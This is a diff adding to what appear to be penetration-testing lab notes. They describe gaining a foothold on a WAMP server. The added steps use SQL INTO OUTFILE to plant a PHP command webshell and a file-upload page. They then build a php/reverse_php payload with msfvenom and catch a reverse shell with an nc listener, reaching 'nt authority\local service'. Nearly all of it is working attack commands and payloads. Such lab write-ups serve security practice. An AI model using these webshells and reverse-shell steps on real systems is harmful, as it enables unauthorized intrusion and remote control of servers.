@@ -105,3 +105,59 @@ we can create a webshell.
 ```
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:/wamp/www/shell.php"
 ```
+
+then we visit this page with foxyproxy:
+
+```
+http://192.168.53.189:8080/shell.php?cmd=dir
+```
+
+we have non-root access now.
+
+let's also make an uploader file so we can upload a proper web shell.
+
+later, we will modify a webshell from `/usr/share/webshells/php/`.
+
+```
+SELECT   
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"  
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+
+```
+
+now we can upload a webshell. we need to modify the IP in `/usr/share/webshells/php/php-reverse-shell.php` to match the attacker.
+
+```bash
+cp /usr/share/webshells/php/php-reverse-shell.php ./
+#(nano edit file) add IP, change shell to cmd.exe
+
+http://192.168.53.189:8080/uploader.php
+
+# on attacker
+nc -nvlp 1234
+
+# visit on victim
+http://192.168.53.189:8080/php-reverse-shell.php
+```
+
+okay, this failed. we should use msfvenom.
+
+```bash
+msfvenom -p php/reverse_php LHOST=192.168.49.53 LPORT=4444 -f raw > shell.php
+
+# upload
+http://192.168.53.189:8080/uploader.php
+
+# on attacker
+nc -nvlp 4444
+
+# visit on victim
+http://192.168.53.189:8080/shell.php
+```
+
+works! We have local service.
+
+```
+whoami
+nt authority\local service
+```
